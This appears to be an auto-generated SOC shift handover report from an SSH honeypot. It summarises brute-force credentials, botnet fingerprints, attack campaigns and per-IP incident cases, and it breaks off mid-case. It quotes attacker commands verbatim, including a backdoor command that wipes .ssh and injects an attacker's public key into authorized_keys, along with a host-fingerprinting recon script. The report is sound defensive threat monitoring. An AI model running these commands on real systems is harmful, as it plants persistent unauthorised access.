# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-30 |
| **Generated At** | 2026-06-30T20:13:17Z |
| **Shift Time** | 20:13 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **115** |
| Confirmed Threats | **113** |
| False Positives Filtered | **2** (1.7%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **16** |
| High Severity Cases | **83** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **32** |
| Malware Samples Analyzed | **5** HIGH · **40** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **110** |
| Unique Credential Pairs | **74** |
| Unique Usernames | **17** |
| Unique Passwords | **65** |
| Successful Auth Pairs | **92** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 58 |
| `345gs5662d34` | 17 |
| `ubuntu` | 7 |
| `lghkel	` | 5 |
| `admin` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 17 |
| `3245gs5662d34` | 16 |
| `zpz}ld	` | 5 |
| `q` | 3 |
| `123456` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 17 |
| `root` | `3245gs5662d34` | 11 |
| `lghkel	` | `zpz}ld	` | 5 |
| `ubuntu` | `q` | 3 |
| `root` | `﻿------fuck------` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `toor1234` | `45.198.224.120` | 2026-06-30T16:56:22 |
| `ubuntu` | `654321` | `45.205.1.42` | 2026-06-30T16:59:08 |
| `root` | `Su123456` | `10.0.0.73` | 2026-06-30T17:06:59 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-06-30T17:07:02 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T17:07:04 |
| `root` | `Abc12345^&*` | `10.0.0.73` | 2026-06-30T17:07:23 |
| `taylor` | `taylor` | `45.198.224.120` | 2026-06-30T17:08:24 |
| `ubuntu` | `q` | `185.242.3.195` | 2026-06-30T17:10:27 |
| `root` | `﻿------fuck------` | `120.48.45.182` | 2026-06-30T17:11:10 |
| `root` | `lz@123456` | `10.0.0.73` | 2026-06-30T17:15:33 |
| `root` | `P@ssw0rd$Ubuntu2025` | `45.205.1.42` | 2026-06-30T17:15:43 |
| `root` | `Passwd@123` | `45.198.224.120` | 2026-06-30T17:20:17 |
| `root` | `Yl@123456` | `10.0.0.73` | 2026-06-30T17:20:46 |
| `gmail` | `123456` | `201.249.89.102` | 2026-06-30T17:24:33 |
| `root` | `active@123` | `10.0.0.73` | 2026-06-30T17:24:33 |
| `345gs5662d34` | `345gs5662d34` | `201.249.89.102` | 2026-06-30T17:24:40 |
| `gmail` | `3245gs5662d34` | `201.249.89.102` | 2026-06-30T17:24:42 |
| `ubuntu` | `Pass2026` | `10.0.0.73` | 2026-06-30T17:26:33 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T17:26:36 |
| `root` | `zaq12wsx` | `10.0.0.73` | 2026-06-30T17:26:37 |
| `zimbra` | `zimbra` | `119.203.251.187` | 2026-06-30T17:31:45 |
| `345gs5662d34` | `345gs5662d34` | `119.203.251.187` | 2026-06-30T17:31:49 |
| `zimbra` | `3245gs5662d34` | `119.203.251.187` | 2026-06-30T17:31:50 |
| `root` | `Passw0rd4H` | `45.198.224.120` | 2026-06-30T17:32:03 |
| `root` | `linux` | `45.205.1.42` | 2026-06-30T17:32:31 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-06-30T17:36:15 |
| `alex` | `xela` | `117.89.249.222` | 2026-06-30T17:36:21 |
| `345gs5662d34` | `345gs5662d34` | `117.89.249.222` | 2026-06-30T17:36:28 |
| `teamspeak` | `1234` | `163.61.39.149` | 2026-06-30T17:39:28 |
| `345gs5662d34` | `345gs5662d34` | `163.61.39.149` | 2026-06-30T17:39:33 |
| `teamspeak` | `3245gs5662d34` | `163.61.39.149` | 2026-06-30T17:39:35 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xcc\xd1\xd1\xca'` | `73.222.233.25` | 2026-06-30T17:43:15 |
| `lghkel	` | `zpz}ld	` | `73.222.233.25` | 2026-06-30T17:43:15 |
| `b'\xcc\xd1\xd1\xca'` | `b'\x8b\xcb\xce'` | `73.222.233.25` | 2026-06-30T17:43:52 |
| `root` | `P@ssw0rds` | `45.198.224.120` | 2026-06-30T17:43:57 |
| `admin` | `ZmqVfoSIP` | `73.222.233.25` | 2026-06-30T17:44:32 |
| `admin` | `admin` | `73.222.233.25` | 2026-06-30T17:45:14 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xd4\xc8\xdc\xc4\xda'` | `73.222.233.25` | 2026-06-30T17:45:57 |
| `admin` | `epicrouter` | `73.222.233.25` | 2026-06-30T17:47:17 |
| `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `73.222.233.25` | 2026-06-30T17:47:58 |
| `"??$` | `abcd` | `73.222.233.25` | 2026-06-30T17:49:11 |
| `root` | `qwertyu` | `45.205.1.42` | 2026-06-30T17:49:18 |
| `ubuntu` | `q` | `10.0.0.73` | 2026-06-30T17:50:30 |
| `lighthouse` | `lighthouse@2026` | `124.40.252.3` | 2026-06-30T17:53:14 |
| `345gs5662d34` | `345gs5662d34` | `124.40.252.3` | 2026-06-30T17:53:18 |
| `lighthouse` | `3245gs5662d34` | `124.40.252.3` | 2026-06-30T17:53:20 |
| `root` | `adminadmin1234` | `182.93.7.194` | 2026-06-30T17:55:44 |
| `345gs5662d34` | `345gs5662d34` | `182.93.7.194` | 2026-06-30T17:55:48 |
| `root` | `3245gs5662d34` | `182.93.7.194` | 2026-06-30T17:55:49 |
| `root` | `P@ss12` | `45.198.224.120` | 2026-06-30T17:55:49 |
| `yunyun` | `yunyun` | `45.205.1.42` | 2026-06-30T18:05:50 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-06-30T18:06:19 |
| `root` | `123@@@` | `144.22.238.238` | 2026-06-30T18:06:19 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-06-30T18:06:23 |
| `root` | `Pass12345678` | `45.198.224.120` | 2026-06-30T18:07:39 |
| `root` | `system@123` | `172.190.51.254` | 2026-06-30T18:14:37 |
| `345gs5662d34` | `345gs5662d34` | `172.190.51.254` | 2026-06-30T18:14:38 |
| `root` | `3245gs5662d34` | `172.190.51.254` | 2026-06-30T18:14:38 |
| `root` | `george` | `45.198.224.120` | 2026-06-30T18:19:21 |
| `root` | `abc@123@` | `40.82.214.8` | 2026-06-30T18:21:35 |
| `345gs5662d34` | `345gs5662d34` | `40.82.214.8` | 2026-06-30T18:21:38 |
| `root` | `3245gs5662d34` | `40.82.214.8` | 2026-06-30T18:21:40 |
| `root` | `123` | `195.178.110.227` | 2026-06-30T18:21:50 |
| `test1` | `123456` | `45.205.1.42` | 2026-06-30T18:22:34 |
| `root` | `1234` | `195.178.110.227` | 2026-06-30T18:23:57 |
| `root` | `12345` | `195.178.110.227` | 2026-06-30T18:26:05 |
| `root` | `1234567` | `195.178.110.227` | 2026-06-30T18:30:16 |
| `root` | `1234rewq` | `45.198.224.120` | 2026-06-30T18:30:59 |
| `root` | `12345678` | `195.178.110.227` | 2026-06-30T18:32:19 |
| `root` | `123456789` | `195.178.110.227` | 2026-06-30T18:34:19 |
| `root` | `1234567890` | `195.178.110.227` | 2026-06-30T18:36:21 |
| `root` | `Passwd1234` | `45.205.1.42` | 2026-06-30T18:38:19 |
| `root` | `123abc` | `195.178.110.227` | 2026-06-30T18:38:25 |
| `root` | `minute` | `115.190.51.71` | 2026-06-30T18:39:30 |
| `345gs5662d34` | `345gs5662d34` | `115.190.51.71` | 2026-06-30T18:39:35 |
| `root` | `3245gs5662d34` | `115.190.51.71` | 2026-06-30T18:39:37 |
| `root` | `1q2w3e4r` | `195.178.110.227` | 2026-06-30T18:40:35 |
| `www-data` | `12345` | `185.242.3.195` | 2026-06-30T18:42:24 |
| `root` | `Pa55word2009` | `45.198.224.120` | 2026-06-30T18:42:37 |
| `root` | `P@ssw0rd123` | `195.178.110.227` | 2026-06-30T18:42:45 |
| `root` | `abc123` | `195.178.110.227` | 2026-06-30T18:45:02 |
| `root` | `isg` | `222.232.176.7` | 2026-06-30T18:45:17 |
| `345gs5662d34` | `345gs5662d34` | `222.232.176.7` | 2026-06-30T18:45:21 |
| `root` | `3245gs5662d34` | `222.232.176.7` | 2026-06-30T18:45:22 |
| `root` | `admin123` | `195.178.110.227` | 2026-06-30T18:47:27 |
| `root` | `123456@qq` | `91.211.95.158` | 2026-06-30T18:48:36 |
| `345gs5662d34` | `345gs5662d34` | `91.211.95.158` | 2026-06-30T18:48:39 |
| `root` | `3245gs5662d34` | `91.211.95.158` | 2026-06-30T18:48:40 |
| `root` | `letmein` | `195.178.110.227` | 2026-06-30T18:49:57 |
| `root` | `pass123` | `195.178.110.227` | 2026-06-30T18:52:48 |
| `root` | `zaq1xsw2` | `45.198.224.120` | 2026-06-30T18:54:09 |
| `ubuntu` | `a12345678` | `45.205.1.42` | 2026-06-30T18:54:18 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **115** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 39 |
| libssh | 38 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 26 | 9 |
| `16443846184e...` | Generic scanner | 22 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 15 | 1 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 26 | 9 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 22 | 3 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 15 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 14 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 11 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.227`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `40.82.214.8`, `119.203.251.187`, `201.249.89.102`, `222.232.176.7`, `182.93.7.194`, `172.190.51.254`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **28** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS267784` | Flyservers S.A. | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS398324` | Censys, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (83)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7f86cfc3cb89

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 16:56 |
| **Last Seen** | 2026-06-30 16:56 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:56:14` | `cowrie.session.connect` |
| `2026-06-30 16:56:17` | `cowrie.client.version` |
| `2026-06-30 16:56:17` | `cowrie.client.kex` |
| `2026-06-30 16:56:22` | `cowrie.login.success` |
| `2026-06-30 16:56:26` | `cowrie.session.params` |
| `2026-06-30 16:56:26` | `cowrie.command.input` |
| `2026-06-30 16:56:28` | `cowrie.log.closed` |
| `2026-06-30 16:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3700fda43bff

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 16:59 |
| **Last Seen** | 2026-06-30 16:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 16:59:05` | `cowrie.session.connect` |
| `2026-06-30 16:59:05` | `cowrie.client.version` |
| `2026-06-30 16:59:05` | `cowrie.client.kex` |
| `2026-06-30 16:59:08` | `cowrie.login.success` |
| `2026-06-30 16:59:09` | `cowrie.session.params` |
| `2026-06-30 16:59:09` | `cowrie.command.input` |
| `2026-06-30 16:59:09` | `cowrie.log.closed` |
| `2026-06-30 16:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bff8978d630

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 17:08 |
| **Last Seen** | 2026-06-30 17:08 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:08:17` | `cowrie.session.connect` |
| `2026-06-30 17:08:18` | `cowrie.client.version` |
| `2026-06-30 17:08:18` | `cowrie.client.kex` |
| `2026-06-30 17:08:24` | `cowrie.login.success` |
| `2026-06-30 17:08:28` | `cowrie.session.params` |
| `2026-06-30 17:08:28` | `cowrie.command.input` |
| `2026-06-30 17:08:30` | `cowrie.log.closed` |
| `2026-06-30 17:08:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28b734fc6f80

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 17:10 |
| **Last Seen** | 2026-06-30 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:10:26` | `cowrie.session.connect` |
| `2026-06-30 17:10:26` | `cowrie.client.version` |
| `2026-06-30 17:10:26` | `cowrie.client.kex` |
| `2026-06-30 17:10:27` | `cowrie.login.success` |
| `2026-06-30 17:10:27` | `cowrie.session.params` |
| `2026-06-30 17:10:27` | `cowrie.command.input` |
| `2026-06-30 17:10:28` | `cowrie.log.closed` |
| `2026-06-30 17:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baf4d005c6ce

| Field | Detail |
|---|---|
| **Source IP** | `120.48.45[.]182` |
| **First Seen** | 2026-06-30 17:11 |
| **Last Seen** | 2026-06-30 17:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:11:08` | `cowrie.session.connect` |
| `2026-06-30 17:11:09` | `cowrie.client.version` |
| `2026-06-30 17:11:09` | `cowrie.client.kex` |
| `2026-06-30 17:11:10` | `cowrie.login.success` |
| `2026-06-30 17:11:12` | `cowrie.session.params` |
| `2026-06-30 17:11:12` | `cowrie.command.input` |
| `2026-06-30 17:11:12` | `cowrie.log.closed` |
| `2026-06-30 17:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.45[.]182` to AbuseIPDB if not already reported
- [ ] Block `120.48.45[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-700fd8582d61

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 17:15 |
| **Last Seen** | 2026-06-30 17:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:15:40` | `cowrie.session.connect` |
| `2026-06-30 17:15:40` | `cowrie.client.version` |
| `2026-06-30 17:15:40` | `cowrie.client.kex` |
| `2026-06-30 17:15:43` | `cowrie.login.success` |
| `2026-06-30 17:15:44` | `cowrie.session.params` |
| `2026-06-30 17:15:44` | `cowrie.command.input` |
| `2026-06-30 17:15:45` | `cowrie.log.closed` |
| `2026-06-30 17:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c83cbb411cc

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 17:20 |
| **Last Seen** | 2026-06-30 17:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:20:09` | `cowrie.session.connect` |
| `2026-06-30 17:20:10` | `cowrie.client.version` |
| `2026-06-30 17:20:10` | `cowrie.client.kex` |
| `2026-06-30 17:20:17` | `cowrie.login.success` |
| `2026-06-30 17:20:20` | `cowrie.session.params` |
| `2026-06-30 17:20:20` | `cowrie.command.input` |
| `2026-06-30 17:20:22` | `cowrie.log.closed` |
| `2026-06-30 17:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19ce81c7a60a

| Field | Detail |
|---|---|
| **Source IP** | `201.249.89[.]102` |
| **First Seen** | 2026-06-30 17:24 |
| **Last Seen** | 2026-06-30 17:24 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:24:28` | `cowrie.session.connect` |
| `2026-06-30 17:24:28` | `cowrie.client.version` |
| `2026-06-30 17:24:31` | `cowrie.client.kex` |
| `2026-06-30 17:24:33` | `cowrie.login.success` |
| `2026-06-30 17:24:35` | `cowrie.session.params` |
| `2026-06-30 17:24:35` | `cowrie.command.input` |
| `2026-06-30 17:24:35` | `cowrie.command.failed` |
| `2026-06-30 17:24:37` | `cowrie.log.closed` |
| `2026-06-30 17:24:38` | `cowrie.session.params` |
| `2026-06-30 17:24:38` | `cowrie.command.input` |
| `2026-06-30 17:24:38` | `cowrie.session.file_download` |
| `2026-06-30 17:24:38` | `cowrie.log.closed` |
| `2026-06-30 17:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.89[.]102` to AbuseIPDB if not already reported
- [ ] Block `201.249.89[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c7f30d88d1

| Field | Detail |
|---|---|
| **Source IP** | `201.249.89[.]102` |
| **First Seen** | 2026-06-30 17:24 |
| **Last Seen** | 2026-06-30 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:24:39` | `cowrie.session.connect` |
| `2026-06-30 17:24:39` | `cowrie.client.version` |
| `2026-06-30 17:24:39` | `cowrie.client.kex` |
| `2026-06-30 17:24:40` | `cowrie.login.success` |
| `2026-06-30 17:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.89[.]102` to AbuseIPDB if not already reported
- [ ] Block `201.249.89[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb94ac440b55

| Field | Detail |
|---|---|
| **Source IP** | `201.249.89[.]102` |
| **First Seen** | 2026-06-30 17:24 |
| **Last Seen** | 2026-06-30 17:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:24:41` | `cowrie.session.connect` |
| `2026-06-30 17:24:41` | `cowrie.client.version` |
| `2026-06-30 17:24:41` | `cowrie.client.kex` |
| `2026-06-30 17:24:42` | `cowrie.login.success` |
| `2026-06-30 17:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.89[.]102` to AbuseIPDB if not already reported
- [ ] Block `201.249.89[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9da88f69b9a4

| Field | Detail |
|---|---|
| **Source IP** | `119.203.251[.]187` |
| **First Seen** | 2026-06-30 17:31 |
| **Last Seen** | 2026-06-30 17:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:31:44` | `cowrie.session.connect` |
| `2026-06-30 17:31:44` | `cowrie.client.version` |
| `2026-06-30 17:31:44` | `cowrie.client.kex` |
| `2026-06-30 17:31:45` | `cowrie.login.success` |
| `2026-06-30 17:31:46` | `cowrie.session.params` |
| `2026-06-30 17:31:46` | `cowrie.command.input` |
| `2026-06-30 17:31:46` | `cowrie.command.failed` |
| `2026-06-30 17:31:47` | `cowrie.log.closed` |
| `2026-06-30 17:31:47` | `cowrie.session.params` |
| `2026-06-30 17:31:47` | `cowrie.command.input` |
| `2026-06-30 17:31:48` | `cowrie.session.file_download` |
| `2026-06-30 17:31:48` | `cowrie.log.closed` |
| `2026-06-30 17:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.203.251[.]187` to AbuseIPDB if not already reported
- [ ] Block `119.203.251[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9b4d8e77d27

| Field | Detail |
|---|---|
| **Source IP** | `119.203.251[.]187` |
| **First Seen** | 2026-06-30 17:31 |
| **Last Seen** | 2026-06-30 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
